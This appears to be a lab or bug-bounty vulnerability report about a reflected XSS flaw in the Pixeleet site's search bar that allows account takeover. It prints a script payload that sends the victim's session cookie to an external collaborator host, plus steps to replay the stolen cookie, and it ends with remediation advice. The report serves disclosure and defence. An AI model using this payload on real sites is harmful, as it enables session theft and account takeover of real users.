## Title
Reflected XSS to Account Takeover
<!-- Write a short, clear title describing the vulnerability and where it was found. Example: Stored XSS in User Profile -->

## Description
**Affected URL:** https://pixeleet.pwnedbox.site/
<!-- Explain what the vulnerability is, where it exists, and why it is a security issue. Include the affected URL or endpoint. -->
A Reflected Cross-Site Scripting (XSS) vulnerability exists in the search bar functionality on the Pixeleet web application (`https://pixeleet.pwnedbox.site/index.php`). User-supplied input in the search field is reflected back in the HTTP response without proper sanitization or HTML encoding, allowing arbitrary JavaScript execution in the victim's browser. Additionally, the session cookie (`PHPSESSID`) lacks the `HttpOnly` flag, enabling an attacker to exfiltrate the victim's session identifier via JavaScript and achieve full account takeover.
## Steps to Reproduce
<!-- Provide clear, numbered steps so another person can reproduce the issue. Include required requests, parameters, and actions. -->
1. Navigate to `https://pixeleet.pwnedbox.site/` and click on **Join** (`https://pixeleet.pwnedbox.site/index.php?action=register`) to register a victim account (`Satya victim`, `satya1234@gmail.com`).
2. Log in to the victim account on `https://pixeleet.pwnedbox.site/index.php`.
3. In the top navigation search bar ("Search Pixeleet..."), enter the following XSS payload to exfiltrate `document.cookie` to an attacker-controlled Burp Collaborator server:
   ```html
   '"><script>document.write(`<img src=[https://zy1p23olh9sqv6wrdmcc8x1zjqphd71w.oastify.com/$](https://zy1p23olh9sqv6wrdmcc8x1zjqphd71w.oastify.com/$){document.cookie}>`)</script>
4. Submit the search query; the payload executes in the victim's browser and triggers an HTTP request containing the victim's PHPSESSID cookie (5ade3ac9a79d80b4e9bdab25cb4762ec) to the Burp Collaborator endpoint.
5. Open a separate unauthenticated browser session, navigate to https://pixeleet.pwnedbox.site/, open Developer Tools (Storage > Cookies), replace the PHPSESSID cookie value with the stolen session token (5ade3ac9a79d80b4e9bdab25cb4762ec), and refresh the page to gain full access to the victim's account (Satya victim).
## POC (Proof of Concept)
<!-- Add screenshots, HTTP requests/responses, payloads, or videos that demonstrate the vulnerability. -->
1. Landing & Sign-In Page: Shows the Pixeleet homepage at https://pixeleet.pwnedbox.site/ with the Join button highlighted.

<img width="1920" height="969" alt="1" src="https://github.com/user-attachments/assets/cd33ca68-c9a3-4923-a83c-2c056ffd918f" />

2. Victim Account Registration: Shows the registration form at https://pixeleet.pwnedbox.site/index.php?action=register used to create the victim account (Satya victim).

<img width="1920" height="968" alt="2" src="https://github.com/user-attachments/assets/5a6f0f13-d2d8-47c9-83ea-8922fa388fb1" />

3. Payload Injection in Search Bar: Shows the logged-in victim profile (Satya victim) on https://pixeleet.pwnedbox.site/index.php with the malicious XSS payload entered into the top search bar.

<img width="1920" height="966" alt="3" src="https://github.com/user-attachments/assets/0cac3d2d-2393-44c9-9361-7698b6c3f866" />

4. Cookie Exfiltration via Burp Collaborator: Shows Burp Collaborator receiving the out-of-band HTTP GET request containing the victim's stolen session cookie (GET /PHPSESSID=5ade3ac9a79d80b4e9bdab25cb4762ec).

<img width="1920" height="1020" alt="4" src="https://github.com/user-attachments/assets/d3844f12-dc85-4027-a9a3-b4558ab94cad" />

5. Session Hijacking in Attacker Browser: Shows the attacker's unauthenticated browser session where the stolen PHPSESSID value (5ade3ac9a79d80b4e9bdab25cb4762ec) is injected into cookie storage before refreshing.

<img width="1920" height="971" alt="5" src="https://github.com/user-attachments/assets/b0e73f73-0982-422b-ab92-ceb06b779c9e" />

6. Account Takeover Confirmed: Shows full access to the Satya victim (satya1234@gmail.com) account after refreshing the page with the hijacked session cookie.

<img width="1920" height="964" alt="6" src="https://github.com/user-attachments/assets/29f60aa4-624b-4c53-a038-558b2788d0e0" />

## Impact
<!-- Explain what an attacker could achieve, who could be affected, and the realistic security consequences. -->
An attacker can craft a malicious link containing the XSS payload and trick an authenticated Pixeleet user into clicking it. Upon execution, the script silently steals the victim's PHPSESSID session cookie and sends it to an external server, allowing the attacker to hijack the victim's session and gain complete unauthorized access to their account, personal details, and application functionality without needing their password.
## Remediation
<!-- Suggest specific steps to fix the vulnerability. Include secure coding practices or configuration changes where appropriate. -->
1. HTML-encode all user-supplied input (such as search parameters) before reflecting it in the HTML response using functions like htmlspecialchars($input, ENT_QUOTES, 'UTF-8') in PHP.
2. Set the HttpOnly, Secure, and SameSite=Lax (or Strict) flags on the PHPSESSID session cookie so that client-side JavaScript cannot access document.cookie.
3. Implement a strict Content Security Policy header to restrict inline script execution and unauthorized external network requests.
